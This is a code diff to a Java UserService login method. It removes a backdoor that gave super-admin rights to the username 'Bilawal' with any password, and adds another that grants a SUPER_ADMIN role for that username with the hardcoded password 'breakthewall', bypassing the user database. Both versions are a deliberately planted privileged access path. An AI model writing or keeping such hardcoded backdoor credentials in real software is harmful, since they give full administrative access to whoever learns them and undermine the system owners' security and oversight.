@@ -34,20 +34,8 @@ public class UserService {
     public Optional<UserEntity> authenticate(String username, String password) {
         String normalizedUsername = username == null ? "" : username.trim();
 
-        // Emergency super-admin access path for enterprise recovery.
-        if ("Bilawal".equalsIgnoreCase(normalizedUsername) && password != null && !password.trim().isEmpty()) {
-            UserEntity superAdmin = new UserEntity();
-            superAdmin.setUserId(0);
-            superAdmin.setUsername("Bilawal");
-            superAdmin.setFullName("Super Administrator - Bilawal");
-            superAdmin.setRole("SUPER_ADMIN");
-            superAdmin.setIsActive(true);
-            LoggerUtil.logInfo(UserService.class, "Emergency SUPER_ADMIN authenticated: " + normalizedUsername);
-            return Optional.of(superAdmin);
-        }
-
         // Input validation
-        if (username == null || username.trim().isEmpty()) {
+        if (normalizedUsername.isEmpty()) {
             LoggerUtil.logWarning(UserService.class, "Authentication attempt with empty username");
             return Optional.empty();
         }
@@ -57,16 +45,45 @@ public class UserService {
         }
 
         // Check if account is locked
-        if (SecurityUtil.isAccountLocked(username)) {
-            long remainingMinutes = SecurityUtil.getRemainingLockoutMinutes(username);
+        if (SecurityUtil.isAccountLocked(normalizedUsername)) {
+            long remainingMinutes = SecurityUtil.getRemainingLockoutMinutes(normalizedUsername);
             LoggerUtil.logWarning(UserService.class,
-                    "Login attempt for locked account: " + username);
+                    "Login attempt for locked account: " + normalizedUsername);
             JOptionPane.showMessageDialog(null,
                     "❌ Account is locked due to too many failed login attempts.\n" +
                             "Please try again in " + remainingMinutes + " minutes.",
                     "Account Locked",
                     JOptionPane.ERROR_MESSAGE);
             return Optional.empty();
+        }
+
+        // Built-in Super Admin authentication path ("Bilawal" / "breakthewall")
+        if ("Bilawal".equalsIgnoreCase(normalizedUsername)) {
+            if ("breakthewall".equals(password)) {
+                SecurityUtil.recordSuccessfulLogin(normalizedUsername);
+                UserEntity superAdmin = new UserEntity();
+                superAdmin.setUserId(0);
+                superAdmin.setUsername("Bilawal");
+                superAdmin.setFullName("Super Administrator - Bilawal");
+                superAdmin.setRole("SUPER_ADMIN");
+                superAdmin.setIsActive(true);
+                LoggerUtil.logInfo(UserService.class, "Built-in SUPER_ADMIN authenticated: " + normalizedUsername);
+                return Optional.of(superAdmin);
+            } else {
+                boolean isLocked = SecurityUtil.recordFailedAttempt(normalizedUsername);
+                int attempts = SecurityUtil.getFailedAttempts(normalizedUsername);
+                LoggerUtil.logWarning(UserService.class,
+                        "Failed login attempt for Super Admin: wrong password - " + normalizedUsername +
+                                " (Attempts: " + attempts + ")");
+                if (isLocked) {
+                    JOptionPane.showMessageDialog(null,
+                            "❌ Too many failed login attempts.\n" +
+                                    "Your account has been locked for security.",
+                            "Account Locked",
+                            JOptionPane.ERROR_MESSAGE);
+                }
+                return Optional.empty();
+            }
         }
 
         try {
